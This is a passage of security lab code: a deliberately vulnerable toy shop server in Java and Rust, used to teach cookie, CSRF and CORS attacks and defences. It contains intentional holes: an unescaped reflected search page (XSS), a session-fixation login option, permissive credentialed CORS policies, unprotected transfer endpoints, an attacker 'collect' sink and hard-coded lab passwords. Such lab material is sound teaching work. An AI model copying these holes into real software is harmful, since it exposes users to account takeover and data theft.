        Resp resp = text("logged out\n").header("Set-Cookie", sessionCookie(r, "", true));
        resp.note = "  session destroyed";
        return resp;
    }

    static Resp account(Req r) {
        Session s = session(r);
        if (s == null || s.user == null) return text("not logged in\n").status(401, "Unauthorized");
        String page = "<html><body><h1>" + s.user + "</h1><p>balance: " + BALANCES.get(s.user) + "</p>"
                + "<form method=\"post\" action=\"/transfer-token\"><input type=\"hidden\" name=\"csrf\" value=\"" + s.csrf + "\">"
                + "<input name=\"to\"><input name=\"amount\"><button>send</button></form></body></html>\n";
        return html(page);
    }

    // Reflected without escaping on purpose: this is the XSS hole the labs use.
    static Resp search(Req r) {
        return html("<html><body><h1>Results for " + q(r, "q", "") + "</h1></body></html>\n");
    }

    static Resp collect(Req r) {
        var sb = new StringBuilder();
        for (var e : r.query().entrySet()) sb.append(e.getKey()).append('=').append(String.join("|", e.getValue())).append(' ');
        Resp resp = text("ok\n");
        resp.note = "  COLLECTED " + sb.toString().trim();
        return resp;
    }

    // ---------------------------------------------------------------- transfers and their defences

    static Resp transfer(Req r) {
        String route = r.path();
        boolean wantsGet = route.equals("/transfer-get");
        if (wantsGet != r.method().equals("GET")) {
            return text("wrong method\n").status(405, "Method Not Allowed").header("Allow", wantsGet ? "GET" : "POST");
        }
        Session s = session(r);
        if (s == null || s.user == null) {
            Resp resp = text("not logged in\n").status(401, "Unauthorized");
            resp.note = "  no usable session";
            return resp;
        }
        String to, amount;
        if (route.equals("/transfer-json")) {
            String ct = header(r.head(), "content-type");
            if (ct == null || !ct.toLowerCase(Locale.ROOT).startsWith("application/json")) return reject("Content-Type is not application/json");
            Matcher mt = Pattern.compile("\"to\"\\s*:\\s*\"([^\"]*)\"").matcher(r.body());
            Matcher ma = Pattern.compile("\"amount\"\\s*:\\s*(\\d+)").matcher(r.body());
            if (!mt.find() || !ma.find()) return reject("bad JSON");
            to = mt.group(1);
            amount = ma.group(1);
        } else if (wantsGet) {
            to = q(r, "to", "");
            amount = q(r, "amount", "0");
        } else {
            to = f(r, "to");
            amount = f(r, "amount");
        }
        switch (route) {
            case "/transfer-token" -> {
                if (!s.csrf.equals(f(r, "csrf"))) return reject("missing or wrong CSRF token");
            }
            case "/transfer-origin" -> {
                String origin = header(r.head(), "origin");
                if (origin == null) return reject("no Origin header");
                if (!origin.equals("http://shop.localhost:" + port)) return reject("Origin " + origin + " is not the shop");
            }
            case "/transfer-fetchmeta" -> {
                String site = header(r.head(), "sec-fetch-site");
                if (site != null && !site.equals("same-origin")) return reject("Sec-Fetch-Site is " + site);
            }
            default -> { }
        }
        int n;
        try { n = Integer.parseInt(amount); } catch (NumberFormatException e) { return reject("bad amount"); }
        if (!BALANCES.containsKey(to)) return reject("no such account");
        synchronized (BALANCES) {
            if (BALANCES.get(s.user) < n) return reject("insufficient funds");
            BALANCES.merge(s.user, -n, Integer::sum);
            BALANCES.merge(to, n, Integer::sum);
        }
        Resp resp = text("transferred " + n + " from " + s.user + " to " + to + "\n");
        resp.note = "  EXECUTED " + s.user + " -> " + to + " " + n;
        return resp;
    }

    static Resp reject(String why) {
        Resp resp = text("rejected: " + why + "\n").status(403, "Forbidden");
        resp.note = "  rejected: " + why;
        return resp;
    }

    // ---------------------------------------------------------------- CORS

    static final String ALLOWED_ORIGIN_SUFFIX = "app.shop.localhost";

    static Resp apiData(Req r) {
        String cors = q(r, "cors", "none");
        String origin = header(r.head(), "origin");
        Resp resp = new Resp();
        resp.header("Content-Type", "application/json");
        resp.header("Cache-Control", "no-store");
        if (r.method().equals("OPTIONS")) {                              // the preflight
            String acrm = header(r.head(), "access-control-request-method");
            String acrh = header(r.head(), "access-control-request-headers");
            resp.status(q(r, "pf", "ok").equals("500") ? 500 : 204, q(r, "pf", "ok").equals("500") ? "Internal Server Error" : "No Content");
            addCors(resp, cors, origin);
            resp.header("Access-Control-Allow-Methods", "GET, POST, PUT");
            if (acrh != null && !q(r, "pf", "ok").equals("nohdr")) resp.header("Access-Control-Allow-Headers", acrh);
            resp.header("Access-Control-Max-Age", "600");
            resp.note = "  PREFLIGHT for " + acrm + (acrh == null ? "" : " with " + acrh) + "  cors=" + cors;
            return resp;
        }
        addCors(resp, cors, origin);
        if (q(r, "expose", "off").equals("on")) resp.header("Access-Control-Expose-Headers", "X-Request-Id");
        resp.header("X-Request-Id", "r-" + (++requestIds));
        String user;
        Session s = session(r);
        user = s == null || s.user == null ? "null" : "\"" + s.user + "\"";
        boolean writes = !r.method().equals("GET");
        if (writes) counter++;
        resp.body = ("{\"user\": " + user + ", \"counter\": " + counter + "}\n").getBytes(StandardCharsets.UTF_8);
        resp.note = (writes ? "  EXECUTED " + r.method() + " counter=" + counter : "") + "  cors=" + cors;
        return resp;
    }

    // The CORS policies the lab compares. Only the last four are things a real service might do, and only
    // "allowlist" is right.
    static void addCors(Resp resp, String cors, String origin) {
        switch (cors) {
            case "star" -> resp.header("Access-Control-Allow-Origin", "*");
            case "echo" -> { if (origin != null) resp.header("Access-Control-Allow-Origin", origin); }
            case "echo-vary" -> {
                resp.header("Vary", "Origin");
                if (origin != null) resp.header("Access-Control-Allow-Origin", origin);
            }
            case "creds" -> {
                resp.header("Vary", "Origin");
                if (origin != null) resp.header("Access-Control-Allow-Origin", origin);
                resp.header("Access-Control-Allow-Credentials", "true");
            }
            case "starcreds" -> {
                resp.header("Access-Control-Allow-Origin", "*");
                resp.header("Access-Control-Allow-Credentials", "true");
            }
            case "allowlist" -> {
                resp.header("Vary", "Origin");
                if (origin != null && origin.equals("http://" + ALLOWED_ORIGIN_SUFFIX + ":" + port)) {
                    resp.header("Access-Control-Allow-Origin", origin);
                    resp.header("Access-Control-Allow-Credentials", "true");
                }
            }
            case "containsbug" -> {                                      // "does it mention our domain?"
                resp.header("Vary", "Origin");
                if (origin != null && origin.contains("shop.localhost")) {
                    resp.header("Access-Control-Allow-Origin", origin);
                    resp.header("Access-Control-Allow-Credentials", "true");
                }
            }
            case "null" -> {
                resp.header("Access-Control-Allow-Origin", "null");
                resp.header("Access-Control-Allow-Credentials", "true");
            }
            default -> { }
        }
    }

    // ---------------------------------------------------------------- plumbing

    static Resp text(String s) {
        Resp r = new Resp();
        r.header("Content-Type", "text/plain; charset=utf-8");
        r.header("Cache-Control", "no-store");
        r.body = s.getBytes(StandardCharsets.UTF_8);
        return r;
    }

    static Resp html(String s) {
        Resp r = text(s);
        r.h.set(0, new String[]{"Content-Type", "text/html; charset=utf-8"});
        return r;
    }

    static String q(Req r, String key, String fallback) {
        List<String> v = r.query().get(key);
        return v == null || v.isEmpty() ? fallback : v.get(0);
    }

    static String f(Req r, String key) {
        List<String> v = r.form().get(key);
        return v == null || v.isEmpty() ? "" : v.get(0);
    }

    static Map<String, List<String>> parseForm(String s) {
        Map<String, List<String>> m = new LinkedHashMap<>();
        if (s.isEmpty()) return m;
        for (String kv : s.split("&")) {
            String[] p = kv.split("=", 2);
            m.computeIfAbsent(URLDecoder.decode(p[0], StandardCharsets.UTF_8), k -> new ArrayList<>())
                    .add(p.length == 2 ? URLDecoder.decode(p[1], StandardCharsets.UTF_8) : "");
        }
        return m;
    }

    static void write(OutputStream out, Resp r, boolean headOnly, boolean keepAlive) throws IOException {
        var sb = new StringBuilder("HTTP/1.1 " + r.status + " " + r.reason + "\r\n");
        sb.append("Date: ").append(ZonedDateTime.now(ZoneOffset.UTC).format(HTTP_DATE)).append("\r\n");
        for (String[] e : r.h) sb.append(e[0]).append(": ").append(e[1]).append("\r\n");
        if (r.status != 204) sb.append("Content-Length: ").append(r.body.length).append("\r\n");
        if (!keepAlive) sb.append("Connection: close\r\n");
        out.write(sb.append("\r\n").toString().getBytes(StandardCharsets.ISO_8859_1));
        if (!headOnly && r.status != 204) out.write(r.body);
        out.flush();
    }

    static String header(List<String> head, String name) {
        String found = null;
        for (int i = 1; i < head.size(); i++) {
            String line = head.get(i);
            int c = line.indexOf(':');
            if (c > 0 && line.substring(0, c).trim().equalsIgnoreCase(name)) {
                String v = line.substring(c + 1).trim();
                found = found == null ? v : found + ", " + v;
            }
        }
        return found;
    }

    static String readLine(InputStream in) throws IOException {
        var line = new ByteArrayOutputStream();
        int b = in.read();
        if (b == -1) return null;
        while (b != -1 && b != '\n') {
            if (b != '\r') line.write(b);
            b = in.read();
        }
        if (b == -1) throw new EOFException();
        return line.toString(StandardCharsets.ISO_8859_1);
    }
}
```

The Rust twin: the same routes, headers, decisions and log lines.

```toml
[package]
name = "h10"
version = "0.1.0"
edition = "2021"

[dependencies]
base64 = "0.22"
hmac = "0.12"
httpdate = "1"
rand = "0.8"
sha2 = "0.10"
subtle = "2"

[[bin]]
name = "cookie_shop"
path = "src/bin/cookie_shop.rs"

[[bin]]
name = "cookie_jar"
path = "src/bin/cookie_jar.rs"

[[bin]]
name = "session_vs_token"
path = "src/bin/session_vs_token.rs"

[profile.release]
opt-level = 3
```

```rust
// The origin server for every H10 lab, Rust twin of CookieShop.java: same routes, same headers, same log lines.
// A toy shop with sessions, a transfer endpoint with five levels of CSRF defence, a CORS endpoint with eight
// policies, and a "cookie bench" that emits whatever Set-Cookie lines you ask for. It answers on every host name.
//
//   GET  /set?c=<Set-Cookie line>&c=...   sends exactly these Set-Cookie fields            (cookie bench)
//   GET  /echo                            prints the cookie and context fields it received (cookie bench)
//        (any path ending in /set or /echo does the same, e.g. /a/b/set)
//   GET  /                                creates an anonymous session, sets the session cookie
//   POST /login   POST /logout   GET /account   GET /search?q=   GET /state
//   POST /transfer           cookie only
//   GET  /transfer-get       state change on GET
//   POST /transfer-token     CSRF token in the form
//   POST /transfer-origin    Origin header must be the shop's
//   POST /transfer-fetchmeta Sec-Fetch-Site must be same-origin
//   POST /transfer-json      Content-Type must be application/json (forces a preflight from other origins)
//   GET|POST|PUT|OPTIONS /api/data        CORS endpoint, policy chosen by ?cors=
//   GET  /blank   GET /collect?...        an empty page; a sink that logs what an attacker would receive
//   GET  /__log[?clear=1]   POST /__reset  the request log, and a reset of all state
// Lab knobs on /login and /: samesite=none|lax|strict|unset  httponly=off  prefix=host  domain=on  secure=on|off
//   fix=on (login keeps the session id: the fixation bug).
// Usage: cookie_shop <port>
use std::collections::{BTreeMap, HashMap};
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Mutex, OnceLock};
use std::thread;
use std::time::{Duration, SystemTime};

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use rand::RngCore;

static PORT: OnceLock<u16> = OnceLock::new();
static COUNTER: AtomicU32 = AtomicU32::new(0);
static REQUEST_IDS: AtomicU32 = AtomicU32::new(0);
static BALANCES: Mutex<BTreeMap<String, i64>> = Mutex::new(BTreeMap::new());
static SESSIONS: Mutex<Option<HashMap<String, Session>>> = Mutex::new(None);
static LOG: Mutex<Vec<String>> = Mutex::new(Vec::new());

const PASSWORDS: [(&str, &str); 3] = [("alice", "wonderland"), ("bob", "builder"), ("mallory", "m4llory")];
const ALLOWED_ORIGIN_HOST: &str = "app.shop.localhost";

#[derive(Clone)]
struct Session {
    user: Option<String>,        // None while anonymous
    csrf: String,
}

// A response. Header lines are kept in order and may repeat: Set-Cookie must never be combined (H07).
struct Resp {
    status: u16,
    reason: &'static str,
    h: Vec<(String, String)>,
    body: Vec<u8>,
    note: String,
}

impl Resp {
    fn new() -> Resp { Resp { status: 200, reason: "OK", h: Vec::new(), body: Vec::new(), note: String::new() } }
    fn status(mut self, s: u16, r: &'static str) -> Resp { self.status = s; self.reason = r; self }
    fn header(mut self, k: &str, v: &str) -> Resp { self.h.push((k.to_string(), v.to_string())); self }
    fn add(&mut self, k: &str, v: &str) { self.h.push((k.to_string(), v.to_string())); }
}

struct Req {
    method: String,
    host: String,
    path: String,
    query: Vec<(String, String)>,
    head: Vec<String>,
    form: Vec<(String, String)>,
    body: String,
}

fn main() -> std::io::Result<()> {
    let port: u16 = std::env::args().nth(1).unwrap().parse().unwrap();
    PORT.set(port).unwrap();
    reset();
    let listener = TcpListener::bind(("127.0.0.1", port))?;
    println!("cookie shop (Rust) on 127.0.0.1:{port}");
    for stream in listener.incoming() {
        let s = stream?;
        thread::spawn(move || serve(s));
    }
    Ok(())
}

fn port() -> u16 { *PORT.get().unwrap() }

fn reset() {
    let mut b = BALANCES.lock().unwrap();
    b.clear();
    b.insert("alice".into(), 1000);
    b.insert("bob".into(), 1000);
    b.insert("mallory".into(), 0);
    *SESSIONS.lock().unwrap() = Some(HashMap::new());
    LOG.lock().unwrap().clear();
    COUNTER.store(0, Ordering::SeqCst);
    REQUEST_IDS.store(0, Ordering::SeqCst);
}

fn token(bytes: usize) -> String {
    let mut b = vec![0u8; bytes];
    rand::rngs::OsRng.fill_bytes(&mut b);
    URL_SAFE_NO_PAD.encode(b)
}

// ---------------------------------------------------------------- connection handling

fn serve(s: TcpStream) {
    let _ = s.set_nodelay(true);
    let _ = s.set_read_timeout(Some(Duration::from_secs(30)));
    let mut out = match s.try_clone() { Ok(c) => c, Err(_) => return };
    let mut input = BufReader::new(s);
    loop {
        let Some(request_line) = read_line(&mut input) else { return };
        let mut head = vec![request_line.clone()];
        loop {
            match read_line(&mut input) {
                Some(l) if l.is_empty() => break,
                Some(l) => head.push(l),
                None => return,
            }
        }
        let mut body = String::new();
        if let Some(cl) = header(&head, "content-length") {
            let mut buf = vec![0u8; cl.trim().parse().unwrap_or(0)];
            if input.read_exact(&mut buf).is_err() { return; }
            body = String::from_utf8_lossy(&buf).into_owned();
        }
        let rl: Vec<&str> = request_line.split(' ').collect();
        if rl.len() != 3 { return; }
        let (method, target) = (rl[0], rl[1]);
        let (path, qs) = target.split_once('?').unwrap_or((target, ""));
        let host = header(&head, "host").map(|h| strip_port(&h.to_lowercase())).unwrap_or_else(|| "-".into());
        let is_form = header(&head, "content-type").is_some_and(|c| c.starts_with("application/x-www-form-urlencoded"));
        let req = Req {
            method: method.to_string(), host, path: path.to_string(), query: parse_form(qs), head,
            form: if is_form { parse_form(&body) } else { Vec::new() }, body,
        };
        let r = route(&req);
        let keep_alive = rl[2] == "HTTP/1.1" && !header(&req.head, "connection").is_some_and(|c| c.eq_ignore_ascii_case("close"));
        if write(&mut out, &r, method == "HEAD", keep_alive).is_err() { return; }
        if path != "/favicon.ico" && !path.starts_with("/__") { log_request(&req, &r); }
        if !keep_alive { return; }
    }
}

fn strip_port(h: &str) -> String {
    match h.rsplit_once(':') {
        Some((a, p)) if !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()) => a.to_string(),
        _ => h.to_string(),
    }
}

// One line per request: who asked (cookie names only, never values), from where, and what happened.
fn log_request(r: &Req, resp: &Resp) {
    let names: Vec<String> = cookies(r).into_iter().map(|c| c.0).collect();
    let mut sb = format!("{:<7} {}{}  cookies=[{}]", r.method, r.host, r.path, names.join(","));
    if let Some(Session { user: Some(u), .. }) = session(r) { sb += &format!("  user={u}"); }
    for n in ["origin", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest"] {
        if let Some(v) = header(&r.head, n) { sb += &format!("  {}={}", n.replace("sec-fetch-", "sf-"), v); }
    }
    sb += &format!("  -> {}{}", resp.status, resp.note);
    println!("{sb}");
    LOG.lock().unwrap().push(sb);
}

// ---------------------------------------------------------------- routing

fn route(r: &Req) -> Resp {
    if r.path.ends_with("/set") { return set(r); }            // any path ending in /set or /echo works, so that the
    if r.path.ends_with("/echo") { return echo(r); }          // cookie Path and the default path can be tested
    match r.path.as_str() {
        "/" => home(r),
        "/login" => login(r),
        "/logout" => logout(r),
        "/account" => account(r),
        "/search" => html(&format!("<html><body><h1>Results for {}</h1></body></html>\n", q(r, "q", ""))),
        "/state" => {
            let b = BALANCES.lock().unwrap();
            text(&(b.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join(" ") + "\n"))
        }
        "/transfer" | "/transfer-get" | "/transfer-token" | "/transfer-origin" | "/transfer-fetchmeta" | "/transfer-json" => transfer(r),
        "/api/data" => api_data(r),
        "/blank" => html("<html><head><title>blank</title></head><body>blank</body></html>\n"),
        "/collect" => collect(r),
        "/__log" => {
            let mut log = LOG.lock().unwrap();
            let all = if log.is_empty() { String::new() } else { log.join("\n") + "\n" };
            if q(r, "clear", "") == "1" { log.clear(); }
            text(&all)
        }
        "/__reset" => { reset(); text("reset\n") }
        _ => text("no such route\n").status(404, "Not Found"),
    }
}

// The cookie bench: whatever is asked for goes out as separate Set-Cookie fields, byte for byte.
fn set(r: &Req) -> Resp {
    let lines: Vec<&String> = r.query.iter().filter(|(k, _)| k == "c").map(|(_, v)| v).collect();
    let mut resp = text(&format!("set {} cookie(s)\n", lines.len()));
    for l in &lines { resp.add("Set-Cookie", l); }
    resp.note = format!("  set {}", lines.len());
    resp
}

fn echo(r: &Req) -> Resp {
    let mut sb = String::new();
    for n in ["host", "cookie", "origin", "referer", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest", "sec-fetch-user"] {
        sb += &format!("{n}: {}\n", header(&r.head, n).unwrap_or_else(|| "-".into()));
    }
    text(&sb)
}

// ---------------------------------------------------------------- sessions

fn cookies(r: &Req) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for line in &r.head[1..] {
        if let Some((n, v)) = line.split_once(':') {
            if n.trim().eq_ignore_ascii_case("cookie") {
                for pair in v.split(';') {
                    let t = pair.trim();
                    if t.is_empty() { continue; }
                    match t.split_once('=') {
                        Some((a, b)) => out.push((a.to_string(), b.to_string())),
                        None => out.push((String::new(), t.to_string())),
                    }
                }
            }
        }
    }
    out
}

// The session cookie: the first one named __Host-sid, else the first one named sid. "First" is the browser's order.
fn session_id(r: &Req) -> Option<String> {
    let all = cookies(r);
    for name in ["__Host-sid", "sid"] {
        if let Some(c) = all.iter().find(|c| c.0 == name) { return Some(c.1.clone()); }
    }
    None
}

fn session(r: &Req) -> Option<Session> {
    let id = session_id(r)?;
    SESSIONS.lock().unwrap().as_ref().unwrap().get(&id).cloned()
}

// The Set-Cookie line for a session id, shaped by the lab knobs.
fn session_cookie(r: &Req, value: &str, expire: bool) -> String {
    let host_prefix = q(r, "prefix", "none") == "host";
    let samesite = q(r, "samesite", "lax");
    let mut sb = format!("{}={}; Path=/", if host_prefix { "__Host-sid" } else { "sid" }, if expire { "" } else { value });
    if q(r, "domain", "off") == "on" { sb += &format!("; Domain={}", r.host); }
    if q(r, "httponly", "on") != "off" { sb += "; HttpOnly"; }
    match samesite.as_str() {
        "lax" => sb += "; SameSite=Lax",
        "strict" => sb += "; SameSite=Strict",
        "none" => sb += "; SameSite=None",
        _ => {}
    }
    let secure = q(r, "secure", "auto");
    if secure == "on" || (secure == "auto" && (host_prefix || samesite == "none")) { sb += "; Secure"; }
    if expire { sb += "; Max-Age=0"; }
    sb
}

fn home(r: &Req) -> Resp {
    match session(r) {
        None => {
            let id = token(16);
            SESSIONS.lock().unwrap().as_mut().unwrap().insert(id.clone(), Session { user: None, csrf: token(12) });
            let mut resp = text("hello, anonymous\n").header("Set-Cookie", &session_cookie(r, &id, false));
            resp.note = "  new anonymous session".into();
            resp
        }
        Some(s) => text(&format!("hello, {}\n", s.user.unwrap_or_else(|| "anonymous".into()))),
    }
}

fn login(r: &Req) -> Resp {
    if r.method != "POST" { return text("POST only\n").status(405, "Method Not Allowed").header("Allow", "POST"); }
    let user = f(r, "user");
    let ok = PASSWORDS.iter().any(|(u, p)| *u == user && *p == f(r, "password"));
    if !ok {
        let mut resp = text("bad credentials\n").status(401, "Unauthorized");
        resp.note = format!("  login failed for {user}");
        return resp;
    }
    let old_id = session_id(r);
    let old = session(r);
    let mut sessions = SESSIONS.lock().unwrap();
    let sessions = sessions.as_mut().unwrap();
    let (id, mut s) = if q(r, "fix", "off") == "on" && old.is_some() {    // the bug: the id the visitor arrived with is kept
        (old_id.clone().unwrap(), old.unwrap())
    } else {                                                              // the fix: a new id at the moment of login
        if let (Some(_), Some(oid)) = (&old, &old_id) { sessions.remove(oid); }
        (token(16), Session { user: None, csrf: token(12) })
    };
    s.user = Some(user.clone());
    let kept = old_id.as_deref() == Some(id.as_str());
    sessions.insert(id.clone(), s);
    let mut resp = text(&format!("logged in as {user}\n")).header("Set-Cookie", &session_cookie(r, &id, false));
    resp.note = format!("  login ok, {}", if kept { "session id kept" } else { "new session id" });
    resp
}

fn logout(r: &Req) -> Resp {
    if let Some(id) = session_id(r) { SESSIONS.lock().unwrap().as_mut().unwrap().remove(&id); }
    let mut resp = text("logged out\n").header("Set-Cookie", &session_cookie(r, "", true));
    resp.note = "  session destroyed".into();
    resp
}

fn account(r: &Req) -> Resp {
    let Some(Session { user: Some(user), csrf }) = session(r) else {
        return text("not logged in\n").status(401, "Unauthorized");
    };
    let balance = BALANCES.lock().unwrap().get(&user).copied().unwrap_or(0);
    html(&format!("<html><body><h1>{user}</h1><p>balance: {balance}</p>\
        <form method=\"post\" action=\"/transfer-token\"><input type=\"hidden\" name=\"csrf\" value=\"{csrf}\">\
        <input name=\"to\"><input name=\"amount\"><button>send</button></form></body></html>\n"))
}

fn collect(r: &Req) -> Resp {
    let mut seen: Vec<(String, Vec<String>)> = Vec::new();
    for (k, v) in &r.query {
        match seen.iter_mut().find(|(n, _)| n == k) {
            Some((_, vs)) => vs.push(v.clone()),
            None => seen.push((k.clone(), vec![v.clone()])),
        }
    }
    let joined: Vec<String> = seen.iter().map(|(k, v)| format!("{k}={}", v.join("|"))).collect();
    let mut resp = text("ok\n");
    resp.note = format!("  COLLECTED {}", joined.join(" "));
    resp
}

// ---------------------------------------------------------------- transfers and their defences

fn reject(why: &str) -> Resp {
    let mut resp = text(&format!("rejected: {why}\n")).status(403, "Forbidden");
    resp.note = format!("  rejected: {why}");
    resp
}

fn transfer(r: &Req) -> Resp {
    let route = r.path.as_str();
    let wants_get = route == "/transfer-get";
    if wants_get != (r.method == "GET") {
        return text("wrong method\n").status(405, "Method Not Allowed").header("Allow", if wants_get { "GET" } else { "POST" });
    }
    let Some(Session { user: Some(user), csrf }) = session(r) else {
        let mut resp = text("not logged in\n").status(401, "Unauthorized");
        resp.note = "  no usable session".into();
        return resp;
    };
    let (to, amount);
    if route == "/transfer-json" {
        let ct = header(&r.head, "content-type").map(|c| c.to_lowercase());
        if !ct.is_some_and(|c| c.starts_with("application/json")) { return reject("Content-Type is not application/json"); }
        match (json_string(&r.body, "to"), json_number(&r.body, "amount")) {
            (Some(t), Some(a)) => { to = t; amount = a; }
            _ => return reject("bad JSON"),
        }
    } else if wants_get {
        to = q(r, "to", "");
        amount = q(r, "amount", "0");
    } else {
        to = f(r, "to");
        amount = f(r, "amount");
    }
    match route {
        "/transfer-token" => if csrf != f(r, "csrf") { return reject("missing or wrong CSRF token"); },
        "/transfer-origin" => match header(&r.head, "origin") {
            None => return reject("no Origin header"),
            Some(o) if o != format!("http://shop.localhost:{}", port()) => return reject(&format!("Origin {o} is not the shop")),
            _ => {}
        },
        "/transfer-fetchmeta" => if let Some(site) = header(&r.head, "sec-fetch-site") {
            if site != "same-origin" { return reject(&format!("Sec-Fetch-Site is {site}")); }
        },
        _ => {}
    }
    let Ok(n) = amount.parse::<i64>() else { return reject("bad amount") };
    let mut b = BALANCES.lock().unwrap();
    if !b.contains_key(&to) { return reject("no such account"); }
    if b[&user] < n { return reject("insufficient funds"); }
    *b.get_mut(&user).unwrap() -= n;
    *b.get_mut(&to).unwrap() += n;
    let mut resp = text(&format!("transferred {n} from {user} to {to}\n"));
    resp.note = format!("  EXECUTED {user} -> {to} {n}");
    resp
}

// "to": "bob" and "amount": 5, found without a JSON library: enough for the lab's fixed shape.
fn json_string(body: &str, key: &str) -> Option<String> {
    let after = body.split_once(&format!("\"{key}\""))?.1.trim_start().strip_prefix(':')?.trim_start().strip_prefix('"')?;
    Some(after.split_once('"')?.0.to_string())
}

fn json_number(body: &str, key: &str) -> Option<String> {
    let after = body.split_once(&format!("\"{key}\""))?.1.trim_start().strip_prefix(':')?.trim_start();
    let digits: String = after.chars().take_while(|c| c.is_ascii_digit()).collect();
    if digits.is_empty() { None } else { Some(digits) }
}

// ---------------------------------------------------------------- CORS

fn api_data(r: &Req) -> Resp {
    let cors = q(r, "cors", "none");
    let origin = header(&r.head, "origin");
    let mut resp = Resp::new().header("Content-Type", "application/json").header("Cache-Control", "no-store");
    if r.method == "OPTIONS" {                                           // the preflight
        let acrm = header(&r.head, "access-control-request-method");
        let acrh = header(&r.head, "access-control-request-headers");
        let pf = q(r, "pf", "ok");
        resp = if pf == "500" { resp.status(500, "Internal Server Error") } else { resp.status(204, "No Content") };
        add_cors(&mut resp, &cors, origin.as_deref());
        resp.add("Access-Control-Allow-Methods", "GET, POST, PUT");
        if let (Some(h), true) = (&acrh, pf != "nohdr") { resp.add("Access-Control-Allow-Headers", h); }
        resp.add("Access-Control-Max-Age", "600");
        resp.note = format!("  PREFLIGHT for {}{}  cors={cors}", acrm.unwrap_or_default(),
                            acrh.map(|h| format!(" with {h}")).unwrap_or_default());
        return resp;
    }
    add_cors(&mut resp, &cors, origin.as_deref());
    if q(r, "expose", "off") == "on" { resp.add("Access-Control-Expose-Headers", "X-Request-Id"); }
    resp.add("X-Request-Id", &format!("r-{}", REQUEST_IDS.fetch_add(1, Ordering::SeqCst) + 1));
    let user = match session(r) { Some(Session { user: Some(u), .. }) => format!("\"{u}\""), _ => "null".into() };
    let writes = r.method != "GET";
    let counter = if writes { COUNTER.fetch_add(1, Ordering::SeqCst) + 1 } else { COUNTER.load(Ordering::SeqCst) };
    resp.body = format!("{{\"user\": {user}, \"counter\": {counter}}}\n").into_bytes();
    resp.note = format!("{}  cors={cors}", if writes { format!("  EXECUTED {} counter={counter}", r.method) } else { String::new() });
    resp
}

// The CORS policies the lab compares. Only the last four are things a real service might do, and only
// "allowlist" is right.
fn add_cors(resp: &mut Resp, cors: &str, origin: Option<&str>) {
    match cors {
        "star" => resp.add("Access-Control-Allow-Origin", "*"),
        "echo" => if let Some(o) = origin { resp.add("Access-Control-Allow-Origin", o) },
        "echo-vary" => {
            resp.add("Vary", "Origin");
            if let Some(o) = origin { resp.add("Access-Control-Allow-Origin", o); }
        }
        "creds" => {
            resp.add("Vary", "Origin");
            if let Some(o) = origin { resp.add("Access-Control-Allow-Origin", o); }
            resp.add("Access-Control-Allow-Credentials", "true");
        }
        "starcreds" => {
            resp.add("Access-Control-Allow-Origin", "*");
            resp.add("Access-Control-Allow-Credentials", "true");
        }
        "allowlist" => {
            resp.add("Vary", "Origin");
            if let Some(o) = origin {
                if o == format!("http://{ALLOWED_ORIGIN_HOST}:{}", port()) {
                    resp.add("Access-Control-Allow-Origin", o);
                    resp.add("Access-Control-Allow-Credentials", "true");
                }
            }
        }
        "containsbug" => {                                               // "does it mention our domain?"
            resp.add("Vary", "Origin");
            if let Some(o) = origin {
                if o.contains("shop.localhost") {
                    resp.add("Access-Control-Allow-Origin", o);
                    resp.add("Access-Control-Allow-Credentials", "true");
                }
            }
        }
        "null" => {
            resp.add("Access-Control-Allow-Origin", "null");
            resp.add("Access-Control-Allow-Credentials", "true");
        }
        _ => {}
    }
}

// ---------------------------------------------------------------- plumbing

fn text(s: &str) -> Resp {
    let mut r = Resp::new().header("Content-Type", "text/plain; charset=utf-8").header("Cache-Control", "no-store");
    r.body = s.as_bytes().to_vec();
    r
}

fn html(s: &str) -> Resp {
    let mut r = text(s);
    r.h[0].1 = "text/html; charset=utf-8".into();
    r
}

fn q(r: &Req, key: &str, fallback: &str) -> String {
    r.query.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone()).unwrap_or_else(|| fallback.to_string())
}

fn f(r: &Req, key: &str) -> String {
    r.form.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone()).unwrap_or_default()
}

fn parse_form(s: &str) -> Vec<(String, String)> {
    if s.is_empty() { return Vec::new(); }
    s.split('&').map(|kv| match kv.split_once('=') {
        Some((k, v)) => (url_decode(k), url_decode(v)),
        None => (url_decode(kv), String::new()),
    }).collect()
}

fn write(out: &mut TcpStream, r: &Resp, head_only: bool, keep_alive: bool) -> std::io::Result<()> {
    let mut sb = format!("HTTP/1.1 {} {}\r\nDate: {}\r\n", r.status, r.reason, httpdate::fmt_http_date(SystemTime::now()));
    for (k, v) in &r.h { sb += &format!("{k}: {v}\r\n"); }
    if r.status != 204 { sb += &format!("Content-Length: {}\r\n", r.body.len()); }
    if !keep_alive { sb += "Connection: close\r\n"; }
    sb += "\r\n";
    out.write_all(sb.as_bytes())?;
    if !head_only && r.status != 204 { out.write_all(&r.body)?; }
    out.flush()
}

fn header(head: &[String], name: &str) -> Option<String> {
    let mut found: Option<String> = None;
    for line in &head[1..] {
        if let Some((n, v)) = line.split_once(':') {
            if n.trim().eq_ignore_ascii_case(name) {
                let v = v.trim();
                found = Some(match found { Some(f) => format!("{f}, {v}"), None => v.to_string() });
            }
        }
    }
    found
}

fn url_decode(s: &str) -> String {
    let b = s.as_bytes();
    let (mut out, mut i) = (Vec::new(), 0);
    while i < b.len() {
        match b[i] {
            b'+' => { out.push(b' '); i += 1; }
            b'%' if i + 2 < b.len() => {
                match u8::from_str_radix(&s[i + 1..i + 3], 16) {
                    Ok(x) => { out.push(x); i += 3; }
                    Err(_) => { out.push(b'%'); i += 1; }
                }
            }
            c => { out.push(c); i += 1; }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

// One CRLF-terminated line without its CRLF; None on EOF or a timeout.
fn read_line(r: &mut BufReader<TcpStream>) -> Option<String> {
    let mut raw = Vec::new();
    match r.read_until(b'\n', &mut raw) {
        Ok(0) | Err(_) => None,
        Ok(_) if raw.last() != Some(&b'\n') => None,
        Ok(_) => Some(raw.iter().filter(|&&b| b != b'\r' && b != b'\n').map(|&b| b as char).collect()),
    }
}
```

